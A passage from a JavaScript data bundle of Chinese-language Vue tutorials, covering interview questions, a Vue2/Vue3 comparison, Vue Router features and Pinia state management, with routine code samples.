\`\`\`

**3. Vuex / Pinia（全局状态管理）**

\`\`\`javascript
// Pinia store
import { defineStore } from 'pinia';

export const useUserStore = defineStore('user', {
  state: () => ({
    user: null,
    token: ''
  }),
  actions: {
    login(userData) {
      this.user = userData;
    }
  }
});

// 组件中使用
const userStore = useUserStore();
userStore.login(userData);
\`\`\`

#### 5. props 和 data 有什么区别？

| 特性 | props | data |
|------|-------|------|
| 数据来源 | 父组件传递 | 组件内部定义 |
| 修改方式 | 不能直接修改 | 可以直接修改 |
| 用途 | 接收外部数据 | 管理内部状态 |

\`\`\`vue
<script>
export default {
  props: {
    title: {
      type: String,
      required: true,
      default: 'Default Title'
    }
  },
  data() {
    return {
      internalCount: 0,
      message: 'Hello'
    };
  }
};
</script>
\`\`\`

### 三、计算属性与监听器

#### 6. computed 和 watch 的区别是什么？

| 特性 | computed | watch |
|------|----------|-------|
| 缓存 | 有缓存 | 无缓存 |
| 返回值 | 有返回值 | 无返回值 |
| 异步支持 | 不支持 | 支持 |
| 适用场景 | 派生状态 | 副作用处理 |

\`\`\`vue
<script>
export default {
  data() {
    return {
      firstName: 'John',
      lastName: 'Doe'
    };
  },
  computed: {
    // 计算属性：有缓存
    fullName() {
      return this.firstName + ' ' + this.lastName;
    }
  },
  watch: {
    // watch：无缓存，支持异步
    firstName(newVal, oldVal) {
      console.log('watch called');
      this.fetchData(newVal);
    }
  },
  methods: {
    async fetchData(name) {
      const res = await fetch('/api/data?name=' + name);
      return await res.json();
    }
  }
};
</script>
\`\`\`

### 四、Vue3 新特性

#### 7. Composition API 和 Options API 有什么区别？

**Options API 的缺点：**
1. 按选项组织代码，相关逻辑分散
2. 逻辑复用困难，需要使用 mixins
3. TypeScript 支持不够友好

**Composition API 的优势：**
1. 按功能组织代码，相关逻辑集中
2. 使用 composables 实现逻辑复用
3. 更好的 TypeScript 支持

\`\`\`vue
<!-- Options API -->
<script>
export default {
  data() {
    return {
      count: 0,
      user: null
    };
  },
  methods: {
    increment() {
      this.count++;
    }
  },
  mounted() {
    this.fetchUser();
  }
};
</script>

<!-- Composition API -->
<script setup>
import { ref, onMounted } from 'vue';

const count = ref(0);
const user = ref(null);

const increment = () => {
  count.value++;
};

const fetchUser = async () => {
  // 获取用户
};

onMounted(() => {
  fetchUser();
});
</script>
\`\`\`

#### 8. ref 和 reactive 有什么区别？

| 特性 | ref | reactive |
|------|-----|----------|
| 适用类型 | 基本类型和对象 | 仅对象和数组 |
| 访问方式 | 通过 .value | 直接访问属性 |
| 模板中 | 自动解包 | 不解包 |
| 替换 | 可以替换 | 不能替换 |

\`\`\`javascript
import { ref, reactive } from 'vue';

// ref：适合基本类型
const count = ref(0);
count.value++;

// reactive：适合对象
const state = reactive({
  count: 0,
  user: { name: 'Alice' }
});
state.count++;
state.user.name = 'Bob';
\`\`\`

### 五、性能优化

#### 9. Vue 性能优化有哪些手段？

**1. 渲染优化**
- 合理使用 v-if 和 v-show
- 避免 v-for 与 v-if 同时使用
- 使用唯一 key，避免使用 index
- 使用 Object.freeze() 冻结大列表

**2. 组件优化**
- 使用异步组件实现代码分割
- 使用 keep-alive 缓存组件
- 使用函数式组件

**3. 响应式优化**
- 使用 shallowRef/shallowReactive
- 合理使用 computed 和 watch

**4. 打包优化**
- 路由懒加载
- 按需导入依赖
- Tree Shaking

\`\`\`vue
<template>
  <!-- 使用唯一 key -->
  <div v-for="item in items" :key="item.id">{{ item.name }}</div>
  
  <!-- 缓存组件 -->
  <keep-alive>
    <component :is="currentComponent" />
  </keep-alive>
</template>

<script setup>
import { shallowRef } from 'vue';

// 冻结大列表
const largeList = shallowRef([]);
</script>
\`\`\`

### 六、Vue Router

#### 10. Vue Router 有哪些导航守卫？

**全局守卫：**
- beforeEach：全局前置守卫
- beforeResolve：全局解析守卫
- afterEach：全局后置守卫

**路由独享守卫：**
- beforeEnter：路由独享前置守卫

**组件内守卫：**
- beforeRouteEnter：进入组件前
- beforeRouteUpdate：组件更新前
- beforeRouteLeave：离开组件前

\`\`\`javascript
// 全局前置守卫
router.beforeEach((to, from, next) => {
  const token = localStorage.getItem('token');
  if (to.meta.requiresAuth && !token) {
    next('/login');
  } else {
    next();
  }
});

// 组件内守卫
export default {
  beforeRouteLeave(to, from, next) {
    const answer = window.confirm('确定要离开吗？');
    next(answer);
  }
};
\`\`\`

### 七、Vuex 与 Pinia

#### 11. Vuex 和 Pinia 有什么区别？

| 特性 | Vuex | Pinia |
|------|------|-------|
| 官方推荐 | Vue2 | Vue3 |
| mutations | 需要 | 不需要 |
| TypeScript | 支持一般 | 支持优秀 |
| 体积 | 较大 | 更小 |

\`\`\`javascript
// Vuex
import { createStore } from 'vuex';

export default createStore({
  state: { count: 0 },
  mutations: {
    increment(state) {
      state.count++;
    }
  }
});

// Pinia
import { defineStore } from 'pinia';

export const useCounterStore = defineStore('counter', {
  state: () => ({ count: 0 }),
  actions: {
    increment() {
      this.count++;
    }
  }
});
\`\`\`

### 面试技巧

1. **理解原理**：不仅要会用，还要理解背后的原理
2. **对比分析**：能够对比 Vue2 和 Vue3 的区别
3. **代码示例**：能够写出简洁的代码示例
4. **最佳实践**：了解实际项目中的最佳实践
5. **性能优化**：掌握性能优化的方法和工具
`,createdAt:"2026-03-16",updatedAt:"2026-03-16"},{id:"vue2-vs-vue3",title:"Vue2 与 Vue3 全面对比",category:"vue",difficulty:"medium",tags:["Vue2","Vue3","对比","迁移指南"],content:`## Vue2 与 Vue3 全面对比

Vue3 于 2020 年 9 月正式发布，相比 Vue2 带来了许多重大改进。本文从多个维度全面对比 Vue2 和 Vue3，帮助开发者理解两者的区别，并为迁移提供参考。

### 一、性能对比

#### 1. 打包体积优化

**Vue2：**
- 完整版本约 30KB（gzip）
- 所有功能都包含在核心包中

**Vue3：**
- 完整版本约 10KB（gzip）
- 模块化设计，支持 Tree Shaking
- 按需导入功能

\`\`\`javascript
// Vue2：全部导入
import Vue from 'vue';

// Vue3：按需导入
import { ref, reactive, computed } from 'vue';
\`\`\`

#### 2. 渲染性能

**Vue2：**
- 虚拟 DOM 基于 Snabbdom
- 全量 Diff 算法
- 静态节点每次都要比较

**Vue3：**
- 自研虚拟 DOM
- 编译时优化 + 运行时优化
- 静态节点提升（Static Hoisting）
- 补丁标志（Patch Flags）
- 事件处理函数缓存

\`\`\`javascript
// Vue2 编译结果
function render() {
  return h('div', { id: 'app' }, [
    h('h1', {}, this.title),
    h('p', { class: 'static' }, 'Static text')
  ]);
}

// Vue3 编译结果（带优化）
const _hoisted_1 = h('p', { class: 'static' }, 'Static text');

function render() {
  return h('div', { id: 'app' }, [
    h('h1', {}, this.title),
    _hoisted_1
  ]);
}
\`\`\`

#### 3. 响应式性能

**Vue2（Object.defineProperty）：**
- 初始化时递归遍历所有属性
- 无法检测新增/删除属性
- 无法检测数组索引变化

**Vue3（Proxy）：**
- 懒代理，访问时才递归
- 支持新增/删除属性检测
- 支持数组索引变化检测
- 支持 Map、Set 等数据结构

### 二、API 设计对比

#### 1. Options API vs Composition API

**Vue2 - Options API：**
按选项（data、methods、computed、watch）组织代码。

\`\`\`vue
<script>
export default {
  data() {
    return {
      count: 0,
      user: null
    };
  },
  methods: {
    increment() {
      this.count++;
    }
  },
  computed: {
    doubleCount() {
      return this.count * 2;
    }
  },
  mounted() {
    this.fetchUser();
  }
};
</script>
\`\`\`

**Vue3 - Composition API：**
按功能组织代码，相关逻辑集中在一起。

\`\`\`vue
<script setup>
import { ref, computed, onMounted } from 'vue';

const count = ref(0);
const user = ref(null);

const increment = () => {
  count.value++;
};

const doubleCount = computed(() => count.value * 2);

const fetchUser = async () => {
  // 获取用户
};

onMounted(() => {
  fetchUser();
});
</script>
\`\`\`

**对比分析：**

| 特性 | Options API | Composition API |
|------|-------------|-----------------|
| 代码组织 | 按选项分散 | 按功能集中 |
| 逻辑复用 | mixins | composables |
| TypeScript 支持 | 一般 | 优秀 |
| 学习曲线 | 低 | 较高 |

#### 2. 生命周期对比

| Vue2 | Vue3 | 说明 |
|------|------|------|
| beforeCreate | setup() | 实例创建前 |
| created | setup() | 实例创建后 |
| beforeMount | onBeforeMount | 挂载前 |
| mounted | onMounted | 挂载后 |
| beforeUpdate | onBeforeUpdate | 更新前 |
| updated | onUpdated | 更新后 |
| beforeDestroy | onBeforeUnmount | 卸载前 |
| destroyed | onUnmounted | 卸载后 |

\`\`\`javascript
// Vue2 生命周期
export default {
  beforeCreate() {
    console.log('beforeCreate');
  },
  created() {
    console.log('created');
  },
  mounted() {
    console.log('mounted');
  },
  beforeDestroy() {
    console.log('beforeDestroy');
  }
};

// Vue3 生命周期
import {
  onBeforeMount,
  onMounted,
  onBeforeUnmount,
  onUnmounted
} from 'vue';

export default {
  setup() {
    onBeforeMount(() => {
      console.log('onBeforeMount');
    });
    
    onMounted(() => {
      console.log('onMounted');
    });
    
    onBeforeUnmount(() => {
      console.log('onBeforeUnmount');
    });
    
    onUnmounted(() => {
      console.log('onUnmounted');
    });
  }
};
\`\`\`

### 三、响应式 API 对比

#### 1. 数据定义

**Vue2：**
\`\`\`javascript
export default {
  data() {
    return {
      count: 0,
      user: {
        name: 'Alice',
        age: 25
      }
    };
  }
};
\`\`\`

**Vue3：**
\`\`\`javascript
import { ref, reactive } from 'vue';

// ref：适合基本类型
const count = ref(0);

// reactive：适合对象
const user = reactive({
  name: 'Alice',
  age: 25
});
\`\`\`

#### 2. 计算属性

**Vue2：**
\`\`\`javascript
export default {
  data() {
    return {
      firstName: 'John',
      lastName: 'Doe'
    };
  },
  computed: {
    fullName() {
      return this.firstName + ' ' + this.lastName;
    }
  }
};
\`\`\`

**Vue3：**
\`\`\`javascript
import { ref, computed } from 'vue';

const firstName = ref('John');
const lastName = ref('Doe');

const fullName = computed(() => {
  return firstName.value + ' ' + lastName.value;
});
\`\`\`

#### 3. 监听器

**Vue2：**
\`\`\`javascript
export default {
  data() {
    return {
      count: 0
    };
  },
  watch: {
    count(newVal, oldVal) {
      console.log('count changed:', newVal, oldVal);
    }
  }
};
\`\`\`

**Vue3：**
\`\`\`javascript
import { ref, watch, watchEffect } from 'vue';

const count = ref(0);

// 监听单个源
watch(count, (newVal, oldVal) => {
  console.log('count changed:', newVal, oldVal);
});

// watchEffect：自动追踪依赖
watchEffect(() => {
  console.log('count:', count.value);
});
\`\`\`

### 四、组件系统对比

#### 1. 组件定义

**Vue2：**
\`\`\`javascript
// 全局注册
Vue.component('my-component', {
  template: '<div>My Component</div>'
});

// 局部注册
export default {
  components: {
    MyComponent
  }
};
\`\`\`

**Vue3：**
\`\`\`javascript
import { defineComponent } from 'vue';
import MyComponent from './MyComponent.vue';

// defineComponent（可选，用于类型推断）
export default defineComponent({
  components: {
    MyComponent
  }
});

// <script setup> 自动注册
<script setup>
import MyComponent from './MyComponent.vue';
</script>
\`\`\`

#### 2. Props 和 Emits

**Vue2：**
\`\`\`vue
<script>
export default {
  props: {
    title: String,
    count: {
      type: Number,
      default: 0
    }
  },
  methods: {
    handleClick() {
      this.$emit('click', { id: 1 });
    }
  }
};
</script>
\`\`\`

**Vue3：**
\`\`\`vue
<script setup>
import { defineProps, defineEmits } from 'vue';

const props = defineProps({
  title: String,
  count: {
    type: Number,
    default: 0
  }
});

const emit = defineEmits(['click', 'update']);

const handleClick = () => {
  emit('click', { id: 1 });
};
</script>
\`\`\`

### 五、状态管理对比

#### Vuex 3 vs Vuex 4 vs Pinia

**Vuex 3（Vue2）：**
\`\`\`javascript
import Vue from 'vue';
import Vuex from 'vuex';

Vue.use(Vuex);

export default new Vuex.Store({
  state: {
    count: 0
  },
  mutations: {
    increment(state) {
      state.count++;
    }
  },
  actions: {
    increment({ commit }) {
      commit('increment');
    }
  }
});
\`\`\`

**Vuex 4（Vue3）：**
\`\`\`javascript
import { createStore } from 'vuex';

export default createStore({
  state: {
    count: 0
  },
  mutations: {
    increment(state) {
      state.count++;
    }
  },
  actions: {
    increment({ commit }) {
      commit('increment');
    }
  }
});
\`\`\`

**Pinia（Vue3 推荐）：**
\`\`\`javascript
import { defineStore } from 'pinia';

export const useCounterStore = defineStore('counter', {
  state: () => ({
    count: 0
  }),
  actions: {
    increment() {
      this.count++;
    }
  },
  getters: {
    doubleCount: (state) => state.count * 2
  }
});

// 组件中使用
const counterStore = useCounterStore();
counterStore.increment();
\`\`\`

### 六、Vue Router 对比

**Vue Router 3（Vue2）：**
\`\`\`javascript
import Vue from 'vue';
import VueRouter from 'vue-router';

Vue.use(VueRouter);

const router = new VueRouter({
  mode: 'history',
  routes: [
    {
      path: '/',
      component: Home
    }
  ]
});
\`\`\`

**Vue Router 4（Vue3）：**
\`\`\`javascript
import { createRouter, createWebHistory } from 'vue-router';

const router = createRouter({
  history: createWebHistory(),
  routes: [
    {
      path: '/',
      component: Home
    }
  ]
});
\`\`\`

### 七、迁移指南

#### 从 Vue2 迁移到 Vue3

**1. 更新依赖：**
\`\`\`json
{
  "dependencies": {
    "vue": "^3.0.0",
    "vue-router": "^4.0.0",
    "vuex": "^4.0.0"
  }
}
\`\`\`

**2. 全局 API 变更：**
\`\`\`javascript
// Vue2
import Vue from 'vue';
Vue.use(Plugin);
Vue.component('MyComponent', MyComponent);

// Vue3
import { createApp } from 'vue';
const app = createApp(App);
app.use(Plugin);
app.component('MyComponent', MyComponent);
app.mount('#app');
\`\`\`

**3. 模板变更：**
- v-model 默认 prop 从 value 改为 modelValue
- v-model 默认 event 从 input 改为 update:modelValue
- v-if 优先级高于 v-for
- 支持多个根节点（Fragment）

**4. 移除的特性：**
- 过滤器（filters）
- 全局 API：Vue.config.keyCodes
- 实例方法：$on, $off, $once
- 功能：inline-template

### 八、最佳实践建议

**1. 新项目：**
- 直接使用 Vue3 + Composition API
- 使用 Pinia 进行状态管理
- 使用 Vite 作为构建工具
- 使用 TypeScript 提高代码质量

**2. 老项目迁移：**
- 评估迁移成本
- 优先迁移公共组件和工具
- 逐步迁移业务组件

**3. 代码组织：**
- 使用 composables 组织可复用逻辑
- 按功能模块划分代码
- 使用 TypeScript 定义类型

### 总结

| 维度 | Vue2 | Vue3 |
|------|------|------|
| 性能 | 较好 | 更优 |
| 体积 | 较大 | 更小 |
| API | Options API | Composition API |
| 响应式 | Object.defineProperty | Proxy |
| TypeScript | 支持一般 | 支持优秀 |
| 多根节点 | 不支持 | 支持 |
| 状态管理 | Vuex 3 | Pinia |
| 路由 | Vue Router 3 | Vue Router 4 |
`,createdAt:"2026-03-16",updatedAt:"2026-03-16"},{id:"vue-router-deep-dive",title:"Vue Router 深度详解",category:"vue",difficulty:"medium",tags:["Vue Router","路由","导航守卫","路由传参"],content:`## Vue Router 深度详解

Vue Router 是 Vue.js 官方的路由管理器，与 Vue.js 深度集成，让构建单页面应用变得简单。本文详细讲解 Vue Router 的核心概念、高级用法和最佳实践。

### 一、Vue Router 基础

#### 1. 安装与配置

**Vue Router 4（Vue3）安装：**
\`\`\`bash
npm install vue-router@4
\`\`\`

**基本配置：**
\`\`\`javascript
// router/index.js
import { createRouter, createWebHistory } from 'vue-router';
import Home from '../views/Home.vue';
import About from '../views/About.vue';

const routes = [
  {
    path: '/',
    name: 'Home',
    component: Home
  },
  {
    path: '/about',
    name: 'About',
    component: About
  }
];

const router = createRouter({
  history: createWebHistory(),
  routes
});

export default router;
\`\`\`

**在 main.js 中注册：**
\`\`\`javascript
import { createApp } from 'vue';
import App from './App.vue';
import router from './router';

const app = createApp(App);
app.use(router);
app.mount('#app');
\`\`\`

#### 2. 路由模式

**History 模式（推荐）：**
\`\`\`javascript
import { createRouter, createWebHistory } from 'vue-router';

const router = createRouter({
  history: createWebHistory(),
  routes
});
\`\`\`

URL 示例：https://example.com/user/123

**Hash 模式：**
\`\`\`javascript
import { createRouter, createWebHashHistory } from 'vue-router';

const router = createRouter({
  history: createWebHashHistory(),
  routes
});
\`\`\`

URL 示例：https://example.com/#/user/123

**Memory 模式（适用于 Node.js 环境）：**
\`\`\`javascript
import { createRouter, createMemoryHistory } from 'vue-router';

const router = createRouter({
  history: createMemoryHistory(),
  routes
});
\`\`\`

### 二、路由配置详解

#### 1. 路由参数

**动态路由参数：**
\`\`\`javascript
const routes = [
  {
    path: '/user/:id',
    name: 'User',
    component: User,
    props: true // 将路由参数作为 props 传递
  }
];
\`\`\`

**组件中获取参数：**
\`\`\`vue
<script setup>
import { useRoute } from 'vue-router';

const route = useRoute();
// 方式 1：通过 route.params
console.log(route.params.id);

// 方式 2：通过 props（需要设置 props: true）
defineProps(['id']);
</script>
\`\`\`

**多个动态参数：**
\`\`\`javascript
{
  path: '/user/:userId/post/:postId',
  name: 'UserPost',
  component: UserPost
}
\`\`\`

**可选参数：**
\`\`\`javascript
{
  path: '/user/:id?',
  name: 'User',
  component: User
}
\`\`\`

**通配符参数（Vue Router 4 已移除，使用 catch-all 路由）：**
\`\`\`javascript
{
  path: '/:pathMatch(.*)*',
  name: 'NotFound',
  component: NotFound
}
\`\`\`

#### 2. 查询参数

**传递查询参数：**
\`\`\`vue
<template>
  <router-link :to="{ path: '/search', query: { q: 'vue', page: 1 } }">
    搜索 Vue
  </router-link>
</template>

<script setup>
import { useRouter } from 'vue-router';

const router = useRouter();

// 编程式导航
router.push({
  path: '/search',
  query: { q: 'vue', page: 1 }
});
</script>
\`\`\`

**获取查询参数：**
\`\`\`vue
<script setup>
import { useRoute } from 'vue-router';

const route = useRoute();
console.log(route.query.q); // 'vue'
console.log(route.query.page); // '1'
</script>
\`\`\`

#### 3. 路由传参方式对比

| 方式 | 位置 | 刷新后 | 适用场景 |
|------|------|--------|----------|
| params | URL 路径 | 保留 | 资源标识 |
| query | URL 查询 | 保留 | 搜索、过滤 |
| state | history.state | 丢失 | 临时数据 |

**使用 state 传参：**
\`\`\`javascript
router.push('/user/123', {
  state: { from: 'home' }
});

// 获取 state
const location = router.currentRoute.value.state.from;
\`\`\`

### 三、导航守卫

#### 1. 全局守卫

**全局前置守卫：**
\`\`\`javascript
router.beforeEach((to, from, next) => {
  console.log('全局前置守卫');
  console.log('to:', to.path);
  console.log('from:', from.path);
  
  // 权限检查示例
  const token = localStorage.getItem('token');
  if (to.meta.requiresAuth && !token) {
    next('/login');
  } else {
    next();
  }
});
\`\`\`

**全局解析守卫：**
\`\`\`javascript
router.beforeResolve((to, from) => {
  console.log('全局解析守卫');
  // 在所有组件内守卫和异步路由组件被解析后调用
});
\`\`\`

**全局后置守卫：**
\`\`\`javascript
router.afterEach((to, from) => {
  console.log('全局后置守卫');
  // 页面标题设置
  document.title = to.meta.title || '默认标题';
});
\`\`\`

#### 2. 路由独享守卫

\`\`\`javascript
const routes = [
  {
    path: '/dashboard',
    component: Dashboard,
    beforeEnter: (to, from, next) => {
      console.log('路由独享守卫');
      const token = localStorage.getItem('token');
      if (!token) {
        next('/login');
      } else {
        next();
      }
    }
  }
];
\`\`\`

#### 3. 组件内守卫

\`\`\`vue
<script>
export default {
  // 进入组件前
  beforeRouteEnter(to, from, next) {
    console.log('beforeRouteEnter');
    // 不能访问 this，因为组件实例还没创建
    next(vm => {
      // 可以通过 vm 访问组件实例
      console.log(vm);
    });
  },
  
  // 组件更新前
  beforeRouteUpdate(to, from, next) {
    console.log('beforeRouteUpdate');
    // 可以访问 this
    next();
  },
  
  // 离开组件前
  beforeRouteLeave(to, from, next) {
    console.log('beforeRouteLeave');
    const answer = window.confirm('确定要离开吗？未保存的更改将丢失。');
    next(answer);
  }
};
</script>
\`\`\`

#### 4. 守卫执行流程

\`\`\`
1. 导航触发
2. 组件内 beforeRouteLeave（离开的组件）
3. 全局 beforeEach
4. 路由独享 beforeEnter
5. 组件内 beforeRouteEnter
6. 全局 beforeResolve
7. 导航确认
8. 全局 afterEach
9. 组件内 beforeRouteUpdate（复用的组件）
10. 渲染完成
\`\`\`

### 四、路由懒加载

#### 1. 基本懒加载

\`\`\`javascript
const routes = [
  {
    path: '/home',
    // 使用动态导入实现懒加载
    component: () => import('@/views/Home.vue')
  },
  {
    path: '/about',
    component: () => import('@/views/About.vue')
  }
];
\`\`\`

#### 2. 命名 chunk

\`\`\`javascript
const routes = [
  {
    path: '/user/:id',
    // 使用 webpackChunkName 命名 chunk
    component: () => import(/* webpackChunkName: "user" */ '@/views/User.vue')
  },
  {
    path: '/post/:id',
    component: () => import(/* webpackChunkName: "post" */ '@/views/Post.vue')
  }
];
\`\`\`

#### 3. 按功能模块分组

\`\`\`javascript
// 用户相关路由打包到一起
const User = () => import(/* webpackChunkName: "user" */ '@/views/User.vue');
const UserProfile = () => import(/* webpackChunkName: "user" */ '@/views/UserProfile.vue');
const UserSettings = () => import(/* webpackChunkName: "user" */ '@/views/UserSettings.vue');

const routes = [
  { path: '/user', component: User },
  { path: '/user/profile', component: UserProfile },
  { path: '/user/settings', component: UserSettings }
];
\`\`\`

### 五、嵌套路由

#### 1. 配置嵌套路由

\`\`\`javascript
const routes = [
  {
    path: '/user/:id',
    component: User,
    children: [
      {
        path: 'profile',
        component: UserProfile
      },
      {
        path: 'settings',
        component: UserSettings
      },
      {
        path: '',
        redirect: 'profile'
      }
    ]
  }
];
\`\`\`

#### 2. 在父组件中渲染子路由

\`\`\`vue
<!-- User.vue -->
<template>
  <div class="user">
    <h1>用户页面</h1>
    <nav>
      <router-link :to="\`/user/\${$route.params.id}/profile\`">
        个人资料
      </router-link>
      <router-link :to="\`/user/\${$route.params.id}/settings\`">
        设置
      </router-link>
    </nav>
    <!-- 子路由出口 -->
    <router-view />
  </div>
</template>
\`\`\`

### 六、编程式导航

#### 1. 基本导航

\`\`\`vue
<script setup>
import { useRouter } from 'vue-router';

const router = useRouter();

// 字符串路径
router.push('/home');

// 对象路径
router.push({ path: '/home' });

// 命名路由
router.push({ name: 'Home' });

// 带参数
router.push({ name: 'User', params: { id: 123 } });

// 带查询参数
router.push({ path: '/search', query: { q: 'vue' } });
</script>
\`\`\`

#### 2. 导航返回

\`\`\`javascript
// 返回上一页
router.go(-1);

// 或者
router.back();

// 前进
router.forward();
\`\`\`

#### 3. 替换当前记录

\`\`\`javascript
// 使用 replace 模式
router.replace('/home');

// 或者
router.push({ path: '/home', replace: true });
\`\`\`

### 七、路由元信息

#### 1. 配置元信息

\`\`\`javascript
const routes = [
  {
    path: '/dashboard',
    component: Dashboard,
    meta: {
      requiresAuth: true,
      title: '仪表盘',
      roles: ['admin', 'user']
    }
  },
  {
    path: '/admin',
    component: Admin,
    meta: {
      requiresAuth: true,
      title: '管理后台',
      roles: ['admin']
    }
  }
];
\`\`\`

#### 2. 在守卫中使用元信息

\`\`\`javascript
router.beforeEach((to, from, next) => {
  // 检查是否需要认证
  if (to.meta.requiresAuth) {
    const token = localStorage.getItem('token');
    if (!token) {
      return next('/login');
    }
  }
  
  // 检查角色权限
  if (to.meta.roles) {
    const userRole = getUserRole();
    if (!to.meta.roles.includes(userRole)) {
      return next('/403');
    }
  }
  
  next();
});
\`\`\`

#### 3. 在组件中使用元信息

\`\`\`vue
<script setup>
import { useRoute } from 'vue-router';

const route = useRoute();
console.log(route.meta.title);
console.log(route.meta.requiresAuth);
</script>
\`\`\`

### 八、路由过渡动画

#### 1. 基础过渡效果

\`\`\`vue
<template>
  <router-view v-slot="{ Component }">
    <transition name="fade">
      <component :is="Component" />
    </transition>
  </router-view>
</template>

<style>
.fade-enter-active,
.fade-leave-active {
  transition: opacity 0.3s ease;
}

.fade-enter-from,
.fade-leave-to {
  opacity: 0;
}
</style>
\`\`\`

#### 2. 根据路由深度设置过渡

\`\`\`vue
<template>
  <router-view v-slot="{ Component, route }">
    <transition :name="route.meta.transition || 'fade'">
      <component :is="Component" />
    </transition>
  </router-view>
</template>
\`\`\`

### 九、滚动行为

#### 1. 自定义滚动行为

\`\`\`javascript
const router = createRouter({
  history: createWebHistory(),
  routes,
  scrollBehavior(to, from, savedPosition) {
    // 如果使用了浏览器的后退/前进按钮
    if (savedPosition) {
      return savedPosition;
    }
    
    // 始终滚动到顶部
    return { top: 0 };
    
    // 或者滚动到特定元素
    // return { el: '#main', top: 100 };
  }
});
\`\`\`

#### 2. 异步滚动行为

\`\`\`javascript
scrollBehavior: async (to, from, savedPosition) => {
  if (savedPosition) {
    return savedPosition;
  }
  
  if (to.hash) {
    return {
      el: to.hash,
      behavior: 'smooth'
    };
  }
  
  return { top: 0, behavior: 'smooth' };
}
\`\`\`

### 十、最佳实践

1. **使用命名路由**：避免硬编码路径，便于维护
2. **路由懒加载**：减少初始包体积
3. **合理使用守卫**：统一处理权限和认证
4. **使用元信息**：集中管理路由配置
5. **错误处理**：添加 404 页面和错误处理
6. **类型安全**：使用 TypeScript 定义路由类型

\`\`\`typescript
// TypeScript 类型定义
import type { RouteRecordRaw } from 'vue-router';

const routes: RouteRecordRaw[] = [
  {
    path: '/',
    name: 'Home',
    component: () => import('@/views/Home.vue')
  }
];
\`\`\`
`,createdAt:"2026-03-16",updatedAt:"2026-03-16"},{id:"vue-pinia-deep-dive",title:"Pinia 状态管理深度详解",category:"vue",difficulty:"medium",tags:["Pinia","状态管理","Vue3","Store"],content:`## Pinia 状态管理深度详解

Pinia 是 Vue.js 的官方状态管理库，专为 Vue 3 设计。相比 Vuex，Pinia 更轻量、TypeScript 支持更好、API 更简洁。本文详细讲解 Pinia 的核心概念、高级用法和最佳实践。

### 一、Pinia 简介

#### 1. Pinia vs Vuex

| 特性 | Vuex | Pinia |
|------|------|-------|
| 体积 | 较大 | 更小（约 1KB） |
| mutations | 需要 | 不需要 |
| actions | 支持 | 支持 |
| getters | 支持 | 支持 |
| modules | 嵌套模块 | 扁平化多 store |
| TypeScript | 支持一般 | 支持优秀 |
| Devtools | 支持 | 支持更好 |
| 热更新 | 支持 | 支持 |

#### 2. 安装与配置

**安装：**
\`\`\`bash
npm install pinia
\`\`\`

**在 Vue 3 中注册：**
\`\`\`javascript
// main.js
import { createApp } from 'vue';
import { createPinia } from 'pinia';
import App from './App.vue';

const app = createApp(App);
const pinia = createPinia();

app.use(pinia);
app.mount('#app');
\`\`\`

**在 Nuxt 3 中使用：**
\`\`\`bash
npm install @pinia/nuxt
\`\`\`

\`\`\`javascript
// nuxt.config.js
export default defineNuxtConfig({
  modules: ['@pinia/nuxt']
});
\`\`\`

### 二、Pinia 核心概念

#### 1. 定义 Store

**使用 defineStore 定义：**
\`\`\`javascript
// stores/counter.js
import { defineStore } from 'pinia';

export const useCounterStore = defineStore('counter', {
  // state：状态
  state: () => ({
    count: 0,
    name: 'Pinia'
  }),
  
  // getters：计算属性
  getters: {
    doubleCount: (state) => state.count * 2,
    upperName: (state) => state.name.toUpperCase()
  },
  
  // actions：方法
  actions: {
    increment() {
      this.count++;
    },
    incrementBy(amount) {
      this.count += amount;
    }
  }
});
\`\`\`

#### 2. 在组件中使用 Store

**使用 store：**
\`\`\`vue
<script setup>
import { useCounterStore } from '@/stores/counter';

const counterStore = useCounterStore();

// 访问 state
console.log(counterStore.count);

// 访问 getters
console.log(counterStore.doubleCount);

// 调用 actions
counterStore.increment();
counterStore.incrementBy(5);
</script>

<template>
  <div>
    <p>Count: {{ counterStore.count }}</p>
    <p>Double: {{ counterStore.doubleCount }}</p>
    <button @click="counterStore.increment">+1</button>
    <button @click="counterStore.incrementBy(5)">+5</button>
  </div>
</template>
\`\`\`

### 三、State 状态管理

#### 1. 访问 State

**方式 1：直接访问**
\`\`\`javascript
const store = useCounterStore();
console.log(store.count);
\`\`\`

**方式 2：使用 storeToRefs（保持响应式）**
\`\`\`javascript
import { storeToRefs } from 'pinia';

const store = useCounterStore();
const { count, name } = storeToRefs(store);

// 现在可以保持响应式
console.log(count.value);
\`\`\`

**方式 3：解构（失去响应式）**
\`\`\`javascript
const store = useCounterStore();
const { count } = store;
// count 失去响应式，不推荐
\`\`\`

#### 2. 修改 State

**方式 1：直接修改**
\`\`\`javascript
store.count = 10;
\`\`\`

**方式 2：使用 $patch**
\`\`\`javascript
// 单个值
store.$patch({ count: 10 });

// 多个值
store.$patch({
  count: 10,
  name: 'New Name'
});

// 函数方式
store.$patch((state) => {
  state.count++;
  state.name = 'Updated';
});
\`\`\`

**方式 3：使用 actions**
\`\`\`javascript
store.increment();
\`\`\`

#### 3. 重置 State

\`\`\`javascript
// 重置为初始值
store.$reset();
\`\`\`

### 四、Getters 计算属性

#### 1. 基本 Getters

\`\`\`javascript
export const useUserStore = defineStore('user', {
  state: () => ({
    firstName: 'John',
    lastName: 'Doe',
    age: 25
  }),
  getters: {
    // 单个参数
    fullName: (state) => state.firstName + ' ' + state.lastName,
    
    // 使用 this 访问其他 getters
    fullInfo: (state) => state.fullName + ', ' + state.age + ' years old'
  }
});
\`\`\`

#### 2. 带参数的 Getters

\`\`\`javascript
export const useProductStore = defineStore('product', {
  state: () => ({
    products: [
      { id: 1, name: 'Product A', price: 100 },
      { id: 2, name: 'Product B', price: 200 }
    ]
  }),
  getters: {
    // 返回函数的 getter
    getProductById: (state) => (id) => {
      return state.products.find(p => p.id === id);
    },
    
    // 过滤产品
    getProductsByPrice: (state) => (maxPrice) => {
      return state.products.filter(p => p.price <= maxPrice);
    }
  }
});

// 使用
const productStore = useProductStore();
const product = productStore.getProductById(1);
const cheapProducts = productStore.getProductsByPrice(150);
\`\`\`

#### 3. 访问其他 Store 的 Getters

\`\`\`javascript
export const useCartStore = defineStore('cart', {
  state: () => ({
    items: []
  }),
  getters: {
    total: (state) => {
      const userStore = useUserStore();
      const discount = userStore.isVip ? 0.9 : 1;
      return state.items.reduce((sum, item) => sum + item.price, 0) * discount;
    }
  }
});
\`\`\`

### 五、Actions 动作

#### 1. 基本 Actions

\`\`\`javascript
export const useUserStore = defineStore('user', {
  state: () => ({
    user: null,
    token: ''
  }),
  actions: {
    // 同步 action
    setUser(user) {
      this.user = user;
    },
    
    // 异步 action
    async login(credentials) {
